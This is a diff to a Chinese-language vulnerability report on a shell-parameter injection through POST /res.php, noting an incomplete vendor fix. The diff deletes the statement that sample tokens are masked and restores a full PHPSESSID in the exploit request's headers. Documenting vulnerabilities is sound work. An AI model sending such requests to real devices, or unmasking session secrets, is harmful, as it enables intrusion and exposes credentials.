@@ -38,7 +38,6 @@ source_status: "recorded"
 - 修复仅过滤resource但源码还有value/type/id等可控shell参数，覆盖不全
 - 缺固件/CVE/官方修复
 - 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断
 
 ### 操作风险与恢复
 
@@ -169,7 +168,7 @@ payload:
 ```http
 POST /res.php HTTP/1.1
 Host: ip:port
-Cookie: theme=light; distanceUnit=metric; temperatureUnit=celsius; showCameraId=false; clientTimeZoneDST=0; PHPSESSID=872**************************940; clientTimeZoneOffset=-480
+Cookie: theme=light; distanceUnit=metric; temperatureUnit=celsius; showCameraId=false; clientTimeZoneDST=0; PHPSESSID=87215a3eabdc306e4bc37e58d18e4940; clientTimeZoneOffset=-480
 Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "macOS"
